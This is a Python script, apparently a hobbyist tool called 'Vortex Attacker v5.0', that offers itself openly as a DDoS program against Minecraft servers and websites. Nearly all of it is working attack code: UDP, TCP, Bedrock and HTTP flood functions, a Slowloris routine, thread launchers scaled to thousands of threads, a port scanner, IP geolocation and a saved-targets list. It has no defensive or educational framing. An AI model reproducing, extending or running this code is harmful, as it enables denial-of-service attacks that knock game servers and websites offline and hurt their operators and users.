#!/usr/bin/env python3
# VORTEX ATTACKER v5.0 - Ultimate DDoS Tool
# Features: Detailed logs (Success/Error), Minecraft+Website attacks, Enhanced GUI

import socket
import threading
import random
import sys
import time
import os
import json
import subprocess
from datetime import datetime

VERSION = "5.0"
AUTHOR = "Vortex"

# Colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"

LOG_FILE = "attack_logs.json"
TARGETS_FILE = "saved_targets.txt"

def clear_screen():
    os.system('clear')

def print_header():
    print(BOLD + CYAN + r"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║    ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗                         ║
║    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝                         ║
║    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝                          ║
║    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗                          ║
║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗                         ║
║      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝                         ║
║                                                                               ║
║    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗           ║
║   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗          ║
║   ███████║   ██║      ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝          ║
║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗          ║
║   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║          ║
║   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝          ║
║                                                                               ║
║                     VORTEX ATTACKER v5.0 - ULTIMATE EDITION                   ║
║                  Minecraft DDoS | Website DDoS | Network Tools                ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" + RESET)
    print(BLUE + f"  [!] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  |  Logs: {LOG_FILE}" + RESET)
    print(CYAN + "  [!] Press Ctrl+C to stop attack | Ctrl+Z to pause\n" + RESET)

def save_log(attack_data):
    """Save detailed attack log with status"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = {
        "timestamp": timestamp,
        "target": attack_data.get("target"),
        "port": attack_data.get("port"),
        "attack_type": attack_data.get("attack_type"),
        "method": attack_data.get("method"),
        "threads": attack_data.get("threads"),
        "duration": attack_data.get("duration"),
        "status": attack_data.get("status"),
        "packets_sent": attack_data.get("packets_sent", 0),
        "error": attack_data.get("error", None)
    }
    
    # Load existing logs
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        except:
            logs = []
    
    logs.append(log_entry)
    
    # Save only last 100 logs
    if len(logs) > 100:
        logs = logs[-100:]
    
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)
    
    # Print status with color
    if attack_data.get("status") == "SUCCESS":
        print(GREEN + f"[LOG] Attack SUCCESSFUL - {packets_sent} packets sent" + RESET)
    elif attack_data.get("status") == "ERROR":
        print(RED + f"[LOG] Attack FAILED - {attack_data.get('error')}" + RESET)
    else:
        print(YELLOW + f"[LOG] Attack {attack_data.get('status')}" + RESET)

def view_detailed_logs():
    clear_screen()
    print_header()
    print(PURPLE + "\n" + "="*70)
    print("                     DETAILED ATTACK LOGS")
    print("="*70 + RESET)
    
    if not os.path.exists(LOG_FILE):
        print(YELLOW + "\n[!] No logs found. Run some attacks first." + RESET)
        input("\nPress Enter...")
        return
    
    with open(LOG_FILE, "r") as f:
        logs = json.load(f)
    
    if not logs:
        print(YELLOW + "\n[!] No logs found." + RESET)
        input("\nPress Enter...")
        return
    
    print(f"\n{'#'*70}")
    for i, log in enumerate(reversed(logs), 1):
        status_color = GREEN if log['status'] == 'SUCCESS' else (RED if log['status'] == 'ERROR' else YELLOW)
        print(f"\n[{i}] {CYAN}{log['timestamp']}{RESET}")
        print(f"    Target: {WHITE}{log['target']}:{log['port']}{RESET}")
        print(f"    Type: {log['attack_type']} | Method: {log['method']}")
        print(f"    Threads: {log['threads']} | Duration: {log['duration']}s")
        print(f"    Packets: {log.get('packets_sent', 0)}")
        print(f"    Status: {status_color}{log['status']}{RESET}")
        if log.get('error'):
            print(f"    Error: {RED}{log['error']}{RESET}")
        print("-"*50)
    
    print(f"\n{YELLOW}Total attacks: {len(logs)}{RESET}")
    
    # Statistics
    success = sum(1 for l in logs if l['status'] == 'SUCCESS')
    failed = sum(1 for l in logs if l['status'] == 'ERROR')
    print(f"Success: {GREEN}{success}{RESET} | Failed: {RED}{failed}{RESET}")
    
    input("\nPress Enter...")

def clear_logs():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        print(GREEN + "[+] Logs cleared successfully" + RESET)
    else:
        print(YELLOW + "[!] No logs to clear" + RESET)
    time.sleep(1)

def resolve_domain(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[✓] {domain} → {ip}" + RESET)
        return ip
    except:
        print(RED + f"[✗] Cannot resolve {domain}" + RESET)
        return None

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def save_target(ip, port, name):
    with open(TARGETS_FILE, "a") as f:
        f.write(f"{name}|{ip}|{port}\n")
    print(GREEN + f"[✓] Target '{name}' saved" + RESET)

def load_targets():
    targets = []
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, "r") as f:
            for line in f:
                if line.strip():
                    parts = line.strip().split('|')
                    if len(parts) == 3:
                        targets.append({"name": parts[0], "ip": parts[1], "port": parts[2]})
    return targets

# ============ ATTACK METHODS ============

class AttackStats:
    def __init__(self):
        self.packets = 0
        self.errors = 0

def udp_flood(ip, port, stop_event, stats):
    data = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(data, (ip, port))
            stats.packets += 1
        except:
            stats.errors += 1

def tcp_flood(ip, port, stop_event, stats):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            sock.send(b"\x00" * 32)
            sock.close()
            stats.packets += 1
        except:
            stats.errors += 1

def http_flood(url, stop_event, stats):
    import urllib.request
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    req = urllib.request.Request(url, headers=headers)
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(req, timeout=3)
            stats.packets += 1
        except:
            stats.errors += 1

def slowloris(ip, port, stop_event, stats):
    sockets = []
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            sockets.append(sock)
            stats.packets += 1
            if len(sockets) > 200:
                sockets.pop(0).close()
        except:
            stats.errors += 1

def bedrock_flood(ip, port, stop_event, stats):
    packet = b'\x01\x00\x00\x00' + b'\x00' * 32
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(packet, (ip, port))
            stats.packets += 1
        except:
            stats.errors += 1

# ============ IP LOOKUP ============

def ip_lookup():
    clear_screen()
    print_header()
    print(PURPLE + "\n" + "="*50)
    print("                    IP LOOKUP TOOL")
    print("="*50 + RESET)
    
    target = input(YELLOW + "\n[?] Enter IP or Domain: " + RESET)
    
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    print(CYAN + f"\n[+] Looking up {ip}..." + RESET)
    
    try:
        import urllib.request
        import json
        url = f"http://ip-api.com/json/{ip}"
        response = urllib.request.urlopen(url)
        data = json.loads(response.read())
        
        if data['status'] == 'success':
            print("\n" + "═"*40)
            print(GREEN + f"  🌍 Country: {data['country']}" + RESET)
            print(f"  📍 Region: {data['regionName']}")
            print(f"  🏙️  City: {data['city']}")
            print(f"  📡 ISP: {data['isp']}")
            print(f"  🏢 Organization: {data['org']}")
            print(f"  ⏰ Timezone: {data['timezone']}")
            print(f"  📍 Coordinates: {data['lat']}, {data['lon']}")
            print(f"  🗺️  Map: https://www.google.com/maps?q={data['lat']},{data['lon']}")
            print("═"*40)
        else:
            print(RED + "[-] Cannot get IP information" + RESET)
    except Exception as e:
        print(RED + f"[-] Error: {e}" + RESET)
    
    input("\nPress Enter...")

# ============ PORT SCANNER ============

def port_scanner():
    clear_screen()
    print_header()
    print(PURPLE + "\n" + "="*50)
    print("                    PORT SCANNER")
    print("="*50 + RESET)
    
    target = input(YELLOW + "\n[?] Enter IP or Domain: " + RESET)
    
    if not target.replace('.', '').isdigit():
        ip = resolve_domain(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    ports_to_scan = [
        (21, "FTP"), (22, "SSH"), (23, "Telnet"), (25, "SMTP"),
        (53, "DNS"), (80, "HTTP"), (443, "HTTPS"), (8080, "HTTP-Alt"),
        (25565, "Minecraft Java"), (19132, "Minecraft Bedrock"),
        (3306, "MySQL"), (3389, "RDP"), (5900, "VNC")
    ]
    
    print(CYAN + f"\n[+] Scanning {ip}..." + RESET)
    print("\n" + "═"*50)
    
    open_ports = []
    for port, name in ports_to_scan:
        if check_port(ip, port):
            print(GREEN + f"  ✓ Port {port} ({name}) - OPEN" + RESET)
            open_ports.append(port)
        else:
            print(f"  ✗ Port {port} ({name}) - Closed")
    
    print("═"*50)
    print(f"\n{GREEN}Open ports found: {len(open_ports)}{RESET}")
    input("\nPress Enter...")

# ============ MINECRAFT ATTACK ============

def minecraft_attack():
    clear_screen()
    print_header()
    print(PURPLE + "\n" + "="*50)
    print("              MINECRAFT SERVER DDoS ATTACK")
    print("="*50 + RESET)
    
    # Show saved targets
    targets = load_targets()
    if targets:
        print(YELLOW + "\n[!] Saved targets:" + RESET)
        for i, t in enumerate(targets, 1):
            print(f"    {i}. {t['name']} - {t['ip']}:{t['port']}")
        print("    0. New target")
        choice = input("\nSelect target (0 for new): ")
        if choice != "0" and choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                ip = targets[idx]['ip']
                port = int(targets[idx]['port'])
                print(GREEN + f"[✓] Loaded: {targets[idx]['name']}" + RESET)
            else:
                ip = input(YELLOW + "\n[?] Enter IP or Domain: " + RESET)
                port = int(input("[?] Enter Port (25565 Java / 19132 Bedrock): " + RESET))
        else:
            ip = input(YELLOW + "\n[?] Enter IP or Domain: " + RESET)
            port = int(input("[?] Enter Port (25565 Java / 19132 Bedrock): " + RESET))
    else:
        ip = input(YELLOW + "\n[?] Enter IP or Domain: " + RESET)
        port = int(input("[?] Enter Port (25565 Java / 19132 Bedrock): " + RESET))
    
    # Resolve domain
    if not ip.replace('.', '').isdigit():
        resolved = resolve_domain(ip)
        if not resolved:
            input("Press Enter...")
            return
        ip = resolved
    
    # Check server
    print(CYAN + f"\n[+] Checking {ip}:{port}..." + RESET)
    if check_port(ip, port):
        print(GREEN + f"[✓] Server is ONLINE" + RESET)
    else:
        print(RED + f"[✗] Server is OFFLINE or unreachable" + RESET)
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    # Attack method
    print(BLUE + "\n[+] Attack Methods:" + RESET)
    print("   1. TCP Flood (Best for Java servers)")
    print("   2. UDP Flood (Best for Bedrock servers)")
    print("   3. Bedrock Flood (PE / Windows 10)")
    print("   4. SYN Flood (Network layer)")
    
    method_choice = input(YELLOW + "\n[?] Select method (1-4): " + RESET)
    
    methods = {
        "1": (tcp_flood, "TCP Flood"),
        "2": (udp_flood, "UDP Flood"),
        "3": (bedrock_flood, "Bedrock Flood"),
        "4": (tcp_flood, "SYN Flood")
    }
    
    attack_func, method_name = methods.get(method_choice, (tcp_flood, "TCP Flood"))
    
    # Settings
    threads = int(input(YELLOW + "\n[?] Threads (500-5000, default 2000): " + RESET) or 2000)
    duration = int(input(YELLOW + "[?] Duration in seconds (default 60): " + RESET) or 60)
    
    # Save target
    save_choice = input(YELLOW + "\n[?] Save this target? (y/n): " + RESET)
    if save_choice.lower() == 'y':
        name = input("Enter name for this target: ")
        save_target(ip, port, name)
    
    # Confirm
    print(RED + "\n" + "═"*50)
    print(f"  TARGET: {ip}:{port}")
    print(f"  METHOD: {method_name}")
    print(f"  THREADS: {threads}")
    print(f"  DURATION: {duration} seconds")
    print("═"*50 + RESET)
    
    confirm = input("\n[!] Start attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    # Start attack
    stop_event = threading.Event()
    stats = AttackStats()
    
    print(GREEN + f"\n[🔥] ATTACK STARTED on {ip}:{port}" + RESET)
    print(CYAN + "[!] Press Ctrl+C to stop early\n" + RESET)
    
    # Launch threads
    for _ in range(threads):
        t = threading.Thread(target=attack_func, args=(ip, port, stop_event, stats))
        t.daemon = True
        t.start()
    
    # Monitor thread
    def monitor():
        start_time = time.time()
        while not stop_event.is_set():
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            if remaining <= 0:
                break
            print(f"\r[📊] Packets: {stats.packets} | Errors: {stats.errors} | Time left: {remaining}s", end="")
            time.sleep(1)
    
    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n\n[!] Stopping attack early..." + RESET)
    finally:
        stop_event.set()
        time.sleep(1)
        
        # Save log
        status = "SUCCESS" if stats.packets > 0 else "ERROR"
        save_log({
            "target": ip,
            "port": port,
            "attack_type": "MINECRAFT",
            "method": method_name,
            "threads": threads,
            "duration": duration,
            "status": status,
            "packets_sent": stats.packets,
            "error": None if stats.packets > 0 else "No packets sent"
        })
        
        print(GREEN + f"\n[✓] Attack finished. Packets sent: {stats.packets}" + RESET)
        input("\nPress Enter...")

# ============ WEBSITE ATTACK ============

def website_attack():
    clear_screen()
    print_header()
    print(PURPLE + "\n" + "="*50)
    print("                 WEBSITE DDoS ATTACK")
    print("="*50 + RESET)
    
    url = input(YELLOW + "\n[?] Enter URL (https://example.com): " + RESET)
    domain = url.replace("https://", "").replace("http://", "").split("/")[0]
    
    try:
        ip = socket.gethostbyname(domain)
        print(GREEN + f"[✓] Domain resolved to {ip}" + RESET)
    except:
        print(RED + "[✗] Cannot resolve domain" + RESET)
        input("Press Enter...")
        return
    
    # Check if website is reachable
    try:
        import urllib.request
        urllib.request.urlopen(url, timeout=3)
        print(GREEN + "[✓] Website is ONLINE" + RESET)
    except:
        print(RED + "[✗] Website is OFFLINE or unreachable" + RESET)
        proceed = input("Continue anyway? (y/n): ")
        if proceed.lower() != 'y':
            return
    
    # Attack method
    print(BLUE + "\n[+] Attack Methods:" + RESET)
    print("   1. HTTP Flood (Layer 7 - Requests)")
    print("   2. Slowloris (Keep connections open)")
    print("   3. Combined (Both methods)")
    
    method_choice = input(YELLOW + "\n[?] Select method (1-3): " + RESET)
    
    threads = int(input(YELLOW + "\n[?] Threads (500-5000, default 2000): " + RESET) or 2000)
    duration = int(input(YELLOW + "[?] Duration in seconds (default 60): " + RESET) or 60)
    
    print(RED + "\n" + "═"*50)
    print(f"  TARGET: {url}")
    print(f"  METHOD: {'HTTP Flood' if method_choice == '1' else 'Slowloris' if method_choice == '2' else 'Combined'}")
    print(f"  THREADS: {threads}")
    print(f"  DURATION: {duration} seconds")
    print("═"*50 + RESET)
    
    confirm = input("\n[!] Start attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = AttackStats()
    
    print(GREEN + f"\n[🔥] WEBSITE ATTACK STARTED on {url}" + RESET)
    print(CYAN + "[!] Press Ctrl+C to stop early\n" + RESET)
    
    # Launch threads based on method
    if method_choice == "1" or method_choice == "3":
        for _ in range(threads//2 if method_choice == "3" else threads):
            t = threading.Thread(target=http_flood, args=(url, stop_event, stats))
            t.daemon = True
            t.start()
    
    if method_choice == "2" or method_choice == "3":
        for _ in range(threads//2 if method_choice == "3" else threads):
            t = threading.Thread(target=slowloris, args=(ip, 80, stop_event, stats))
            t.daemon = True
            t.start()
    
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print(YELLOW + "\n\n[!] Stopping attack early..." + RESET)
    finally:
        stop_event.set()
        time.sleep(1)
        
        status = "SUCCESS" if stats.packets > 0 else "ERROR"
        save_log({
            "target": url,
            "port": 80,
            "attack_type": "WEBSITE",
            "method": "HTTP+SLOWLORIS" if method_choice == "3" else ("HTTP" if method_choice == "1" else "SLOWLORIS"),
            "threads": threads,
            "duration": duration,
            "status": status,
            "packets_sent": stats.packets,
            "error": None if stats.packets > 0 else "No packets sent"
        })
        
        print(GREEN + f"\n[✓] Attack finished. Requests sent: {stats.packets}" + RESET)
        input("\nPress Enter...")

# ============ MAIN MENU ============

def main_menu():
    while True:
        clear_screen()
        print_header()
        
        print(PURPLE + """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                              MAIN MENU                                        ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║   ╔══════════════════════════╗    ╔══════════════════════════╗                ║
║   ║ 1. MINECRAFT DDoS Attack ║    ║ 2. WEBSITE DDoS Attack   ║                ║
║   ╚══════════════════════════╝    ╚══════════════════════════╝                ║
║                                                                               ║
║   ╔══════════════════════════╗    ╔══════════════════════════╗                ║
║   ║ 3. IP Lookup & Geolocation║    ║ 4. Port Scanner          ║                ║
║   ╚══════════════════════════╝    ╚══════════════════════════╝                ║
║                                                                               ║
║   ╔══════════════════════════╗    ╔══════════════════════════╗                ║
║   ║ 5. View Attack Logs      ║    ║ 6. Clear Logs            ║                ║
║   ╚══════════════════════════╝    ╚══════════════════════════╝                ║
║                                                                               ║
║   ╔══════════════════════════╗    ╔══════════════════════════╗                ║
║   ║ 7. Saved Targets         ║    ║ 8. Exit                  ║                ║
║   ╚══════════════════════════╝    ╚══════════════════════════╝                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""" + RESET)
        
        choice = input(YELLOW + "\n[?] Select option (1-8): " + RESET)
        
        if choice == "1":
            minecraft_attack()
        elif choice == "2":
            website_attack()
        elif choice == "3":
            ip_lookup()
        elif choice == "4":
            port_scanner()
        elif choice == "5":
            view_detailed_logs()
        elif choice == "6":
            clear_logs()
        elif choice == "7":
            targets = load_targets()
            if targets:
                print(YELLOW + "\n[!] Saved targets:" + RESET)
                for i, t in enumerate(targets, 1):
                    print(f"    {i}. {t['name']} - {t['ip']}:{t['port']}")
            else:
                print(YELLOW + "\n[!] No saved targets" + RESET)
            input("\nPress Enter...")
        elif choice == "8":
            print(GREEN + "\n[✓] Exiting Vortex Attacker..." + RESET)
            sys.exit(0)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(YELLOW + "\n\n[!] Exiting..." + RESET)
        sys.exit(0)
